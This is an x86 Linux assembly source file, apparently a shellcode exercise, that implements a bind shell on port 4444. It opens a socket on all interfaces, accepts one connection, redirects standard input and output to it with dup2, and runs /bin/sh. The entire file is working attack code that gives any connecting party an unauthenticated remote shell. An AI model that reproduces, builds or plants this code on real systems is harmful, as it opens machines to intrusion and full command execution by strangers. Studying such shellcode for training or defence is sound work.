;Simple ASM (x86) bind shell on port 4444

global _start

_start:

    ;set the stack pointer
    mov ebp, esp

    ;initialize registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ;Push struct sockaddr_in on the stack
    ;struct sockaddr_in addr;
    ;addr.sin_family = AF_INET;
    ;addr.sin_port = htons(4444);
    ;addr.sin_addr.s_addr = INADDR_ANY;
    push eax
    push eax            ;fill the end of the structure with 8 zeros
    push eax            ;addr.sin_addr.s_addr = INADDR_ANY 
    push word 0x5c11    ;addr.sin_port = htons(4444)
    push word 0x02      ;addr.sin_family = AF_INET

    ;int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    mov ax, 0x167       ;socket syscall number
    mov bl, 0x02        ;AF_INET value
    mov cl, 0x01        ;SOCK_STREAM value
    int 0x80            ;Go for it
    mov edi, eax        ;return value from the socket syscall

    ;bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    xor eax, eax
    mov ax, 0x169       ;bind system call number
    mov ebx, edi        ;sockfd 
    mov ecx, esp        ;point to the start of the stack
    mov edx, ebp
    sub edx, esp        ;use the stack pointers (esp and ebp to calculate the sizeof the structure)
    int 0x80            ;Go for it

    ;listen(sockfd, 0);
    xor eax, eax
    mov ax, 0x16b       ;listen system call number
    mov ebx, edi        ;sockfd value
    xor ecx, ecx        ;NULL value
    int 0x80            ;Go for it

    ;int connfd = accept(sockfd, NULL, NULL);
    xor eax, eax
    mov ax, 0x16c       ;accept system call number
    mov ebx, edi        ;sockfd
    xor ecx, ecx        ;NULL
    xor edx, edx        ;NULL
    xor esi, esi        ;xor esi register
    int 0x80            ;Go for it
    mov esi, eax        ;move the return variable into esi

    ;for (int i = 0; i < 3; i++)
    ;{
    ;    dup2(connfd, i);
    ;}
    mov cl, 3
    dup:
        xor eax, eax
        mov al, 0x3f    ;dup system call number 
        mov ebx, esi    ;mov the fd variable in ebx
        dec cl          ;dec to cl 1
        int 0x80        ;Go for it
        inc cl          ;inc to cl 1
        loop dup

    ;execve("/bin/sh", NULL, NULL);
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f     ;push "/bin//sh" on the stack
    mov al, 0xb         ;execve system call number
    mov ebx, esp        ;initialize execve first parameters with a pointer to /bin//sh
    xor ecx, ecx        ;NULL
    xor edx, edx        ;NULL
    int 0x80            ;Go for it